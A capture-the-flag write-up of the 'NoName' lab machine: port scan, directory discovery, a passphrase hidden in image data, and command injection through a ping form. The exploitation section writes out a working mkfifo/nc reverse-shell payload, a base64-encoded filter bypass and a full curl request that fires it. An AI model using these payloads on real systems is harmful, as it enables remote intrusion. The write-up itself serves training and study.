NoName

Target IP: 192.168.186.15

Scanning


With only one TCP port open at port 80, HTTP is the only entry point to this target machine.

Enumeration

Port 80: HTTP

The webpage above is presented. The page does not process our input, so I cannot perform command injection.


Doing a directory search leads to interesting directories: /admin and /superadmin.php.


However, the page /superadmdin.php is interesting as our input gets processed! I was able to ping successfully. Maybe I can perform command injection?


Aaaaaaaand I am in. By using the payload 127.0.0.1 | id, I obtained the result above. This | character is not filtered; however, the character & is! Certain commands like ls are also filtered! This is a vector I can use for exploitation. Before I do this, I wish to enumerate further.


The /admin contains the contents above. There are four images. Viewing the source-code of this webpage gives us a hint: <!--passphrase:harder-->. Maybe there is a hidden data behind the image(s) and we can use the passphrase to obtain the hidden data?


And this turned out to be true! The image of the Spiderman had hidden data called imp.txt.


The hidden data contains a base64 string. When decoded, it points to the superadmin.php which we already discovered. Time to exploit the machine now.

Exploitation

After trying many different payloads, I had no luck. It looks like the filtering checks for special characters such as &, ;, &&. This means the payload will not work if it contains these filtered characters. Maybe I can encode the payload in base64?


I got a reverse shell connection from the target host now.
I used the payload rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.222 8443 >/tmp/f. After converting it to base64, I obtained the result cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjQ1LjIyMiA4NDQzID4vdG1wL2Y=. The only thing left now is to prefix it with echo, and suffix it with |base64 -d|bash
The full payload (as highlighted in the picture above) I used is %0aecho 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjQ1LjIyMiA4NDQzID4vdG1wL2Y='|base64 -d|bash&submitt=Submit+Query.

Full curl command is listed below

curl -i -s -k -X $'POST' \
    -H $'Host: 192.168.186.15' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.50 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 186' -H $'Origin: http://192.168.186.15' -H $'Connection: close' -H $'Referer: http://192.168.186.15/superadmin.php' -H $'Upgrade-Insecure-Requests: 1' \
    --data-binary $'pinger=%0aecho \'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjQ1LjIyMiA4NDQzID4vdG1wL2Y=\'|base64 -d|bash&submitt=Submit+Query&submitt=Submit+Query' \
    $'http://192.168.186.15/superadmin.php'

Privilege Escalation


Looks like /usr/bin/find can be used.


And now I have a root shell by exploiting the /usr/bin/find binary.
